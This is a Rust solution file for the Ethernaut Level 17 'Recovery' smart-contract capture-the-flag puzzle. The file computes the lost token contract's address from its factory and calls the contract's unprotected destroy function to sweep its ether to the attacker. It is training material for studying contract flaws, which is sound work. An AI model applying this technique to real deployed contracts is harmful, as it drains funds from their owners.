use async_trait::async_trait;
use ctf::{abi::simple_token::SimpleToken, ethernaut::lvl17_recovery::*};
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 17: Recovery
     *
     * A contract creator has built a very simple token
     * factory contract. Anyone can create new
     * tokens with ease. After deploying the first
     * token contract, the creator sent `0.001` ether to
     * obtain more tokens. They have since lost the
     * contract address.
     *
     * This level will be completed if you can recover
     * (or remove) the `0.001` ether from the lost
     * contract address.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let derived_address =
            ethers::utils::get_contract_address(target.address, 1);

        let token = SimpleToken::new(derived_address, offender.to_owned());

        token.destroy(offender.address()).send().await?.await?;

        Ok(())
    }
}
